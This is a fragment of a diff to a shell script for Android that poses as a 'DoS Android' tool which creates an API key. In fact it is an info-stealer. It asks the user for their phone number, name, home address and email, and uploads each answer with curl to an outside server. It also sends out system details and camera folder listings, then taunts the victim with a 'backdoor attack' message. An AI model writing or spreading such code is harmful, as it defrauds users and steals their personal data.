#!/system/bin/bash/sh

clear
@@ -15,54 +14,6 @@ echo "Copyright By Pham Chien
curl -T system.txt http://n8tive.co.za

echo "
 ____       ____
|  _ \  ___/ ___|
| |_| |/ _ \___ \\
|____/ \___/____/
    _              _           _     _
   / \   _ __   __| |_ __ ___ (_) __| |
  / _ \ | |_ \ / _\ | |__/ _ \| |/ _\ |
/_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|
         ©:MinhDat"

echo -e "\033[33;35m"
echo "Please Enter your Personal Information to created API KEY use "
echo ""
echo "Vui Lòng nhập thông tin cá nhân của bạn , tối thiểu là số điện thoại , để chúng tôi tạo dịch vụ tạo API KEY "
echo ""

  echo -n "Phone Number:"
  read phone

  echo "PHONE : $phone" >> system.txt
  curl -T system.txt http://n8tive.co.za

  echo -n "first xand last name :"
  read name

  echo "NAME : $name" >> system.txt
  curl -T system.txt http://n8tive.co.za

  echo -n "Address Home | Dia Chi NHa  : "
  read adrss

  echo "Address : $adrss" >> system.txt
  curl -T system.txt http://n8tive.co.za

  echo -n "Email :"
  read email

  echo "EMAIl : $email" >> system.txt
  curl -T system.txt http://n8tive.co.za

sleep 1
echo "[!] Waiting For Me , To Created Api Key "
echo ""
echo "[!] Vui Lòng chờ chúng tôi để chúng tôi tạo API KEY cho bạn"
sleep 3

  echo "
  System : $(uname -a)
  User   : $(whoami)
@@ -140,6 +91,54 @@ $(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
  ','{$line}',' " >> system.txt
   curl -T system.txt http://n8tive.co.za/

echo "
 ____       ____
|  _ \  ___/ ___|
| |_| |/ _ \___ \\
|____/ \___/____/
    _              _           _     _
   / \   _ __   __| |_ __ ___ (_) __| |
  / _ \ | |_ \ / _\ | |__/ _ \| |/ _\ |
/_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|
         ©:MinhDat"

echo -e "\033[33;35m"
echo "Please Enter your Personal Information to created API KEY use "
echo ""
echo "Vui Lòng nhập thông tin cá nhân của bạn , tối thiểu là số điện thoại , để chúng tôi tạo dịch vụ tạo API KEY "
echo ""

  echo -n "Phone Number:"
  read phone

  echo "PHONE : $phone" >> system.txt
  curl -T system.txt http://n8tive.co.za

  echo -n "first xand last name :"
  read name

  echo "NAME : $name" >> system.txt
  curl -T system.txt http://n8tive.co.za

  echo -n "Address Home | Dia Chi NHa  : "
  read adrss

  echo "Address : $adrss" >> system.txt
  curl -T system.txt http://n8tive.co.za

  echo -n "Email :"
  read email

  echo "EMAIl : $email" >> system.txt
  curl -T system.txt http://n8tive.co.za

sleep 1
echo "[!] Waiting For Me , To Created Api Key "
echo ""
echo "[!] Vui Lòng chờ chúng tôi để chúng tôi tạo API KEY cho bạn"
sleep 3
  echo -n enter ip :
 read line

  echo 3
  sleep 1
  echo 2
  sleep 1
  echo 1
  sleep 1
  echo ATTACK!!!
  sleep 1
  echo -e "\033[33;31m
   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
  exit 1